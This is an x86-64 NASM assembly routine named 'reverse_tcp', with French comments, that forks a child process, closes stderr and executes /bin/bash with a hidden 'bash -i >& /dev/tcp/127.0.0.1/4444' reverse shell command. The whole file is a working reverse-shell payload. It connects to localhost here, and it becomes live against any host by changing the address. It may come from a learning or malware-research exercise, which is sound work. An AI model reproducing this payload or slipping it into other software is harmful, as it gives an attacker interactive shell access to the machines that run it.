bits 64

reverse_tcp:
    push    rbp
    mov     rbp, rsp
    sub     rsp, 32               ; Space for argv[]
    
    lea     rax, [rel shell]      ; Calculer adresse de shell
    mov     [rsp], rax            ; argv[0] = adresse de shell
    
    lea     rax, [rel dash_c]     ; Calculer adresse de dash_c
    mov     [rsp + 8], rax        ; argv[1] = adresse de dash_c
    
    lea     rax, [rel command]    ; Calculer adresse de command
    mov     [rsp + 16], rax       ; argv[2] = adresse de command

    mov     qword [rsp + 24], 0   ; argv[3] = NULL

    ; ====== FORK ====== ;
    mov     rax, 57
    syscall
    cmp     rax, 0
    ; ====== EXECVE ====== ;
    jg      .parent_process

    ; ====== CHILD ====== ;
    mov     rax, 3
    mov     rdi, 2  ; close(STDERR);
    syscall

    mov     rax, 59
    lea     rdi, [rel shell]
    mov     rsi, rsp
    mov     rdx, 0
    syscall

    ; ====== Exit child ====== ;
    mov     rax, 60
    mov     rdi, 1
    syscall

.parent_process:
    add     rsp, 32
    leave
    ret

shell:     db "/bin/bash", 0
dash_c:    db "-c", 0
command:   db "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 2>/dev/null &", 0